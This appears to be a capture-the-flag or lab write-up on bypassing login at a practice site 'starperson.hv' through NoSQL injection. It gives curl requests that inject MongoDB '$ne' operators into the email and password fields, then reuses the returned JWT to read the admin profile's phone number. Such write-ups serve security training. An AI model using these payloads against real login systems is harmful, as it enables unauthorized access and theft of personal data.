# Starperson - NoSQL Injection Writeup

## Information

- **URL**: <http://starperson.hv>
- **IP**: 172.20.7.17
- **Vulnerability**: NoSQL Injection (Authentication Bypass)

## Objective

Find the phone number of the "admin" user by bypassing authentication.

## Steps

1. **Reconnaissance**
    - Accessed the website `http://starperson.hv`, which redirects to `/login`.
    - Inspected the JavaScript file `/js/login.js`. It performs an XMLHttpRequest POST request to `/login` with JSON data (`email` and `password`).

2. **Vulnerability Analysis**
    - The backend likely uses a NoSQL database (like MongoDB).
    - Authentication logic often checks if a user exists with the provided credentials.
    - By injecting NoSQL operators like `$ne` (not equal), we can bypass the password check.

3. **Exploitation**
    - Crafted a malicious POST request using `curl` to bypass the login by asserting that the password is not empty (`$ne: ""`).

    ```bash
    curl -X POST http://starperson.hv/login \
      -H "Content-Type: application/json" \
      -d '{"email": "admin", "password": {"$ne": ""}}'
    ```

    - The server might check both fields, so I injected into both:

    ```bash
    curl -X POST http://starperson.hv/login \
      -H "Content-Type: application/json" \
      -d '{"email": {"$ne": ""}, "password": {"$ne": ""}}'
    ```

    - The server responded with a success message and a JWT token.

4. **Data Extraction**
    - Used the returned JWT token to access the protected page.

    ```bash
    curl -b "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." http://starperson.hv/
    ```

    - Analyzed the HTML response and found the admin's profile information.

## Result

The phone number found in the admin profile is: **614-131-9540**
